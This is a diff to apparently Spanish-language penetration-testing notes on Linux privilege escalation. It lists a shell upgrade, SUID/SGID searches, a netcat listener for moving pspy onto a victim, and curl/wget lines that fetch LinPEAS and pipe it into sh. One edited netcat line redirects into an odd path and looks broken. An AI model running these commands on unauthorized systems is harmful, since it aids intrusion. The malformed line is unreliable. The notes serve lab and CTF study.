@@ -85,7 +85,7 @@ python -c 'import pty;pty.spawn("/bin/bash")'
 > Commands Para **SUID** para **SGID**
 ```bash
 # SUID
-find / -perm -4000 -ls 2>/dev/null
+find / -perm -4000 -ls 2>/dev/null 
 # SGID
 find / -perm -4000 -o -perm -2000 -exec ls -ld {} \; 2>/dev/null
 # AMBOS
@@ -125,7 +125,7 @@ systemctl list-timers
 
 - Víctima: leo el archivo que publica la máquina atacante y lo meto en `pspy` para que sea un binario
 ```bash
-nc -nlvp 443 > pspy
+nc -nlvp 443 > pspy/opt/statuscheck
 ```
 - Atacante Publico el archivo pspy
 ```bash
@@ -323,6 +323,8 @@ curl "https://github.com/diego-treitos/linux-smart-enumeration/releases/latest/d
 
 2. [LinPEAS](https://github.com/Keartland/privilege-escalation-awesome-scripts-suite/blob/master/linPEAS/linpeas.sh) Leer su github que bypassea ANtiVirus
 ```bash
+# Este es el bueno 
+wget https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh
 curl https://raw.githubusercontent.com/carlospolop/privilege-escalation-awesome-scripts-suite/master/linPEAS/linpeas.sh | sh
 # O
 curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | sh
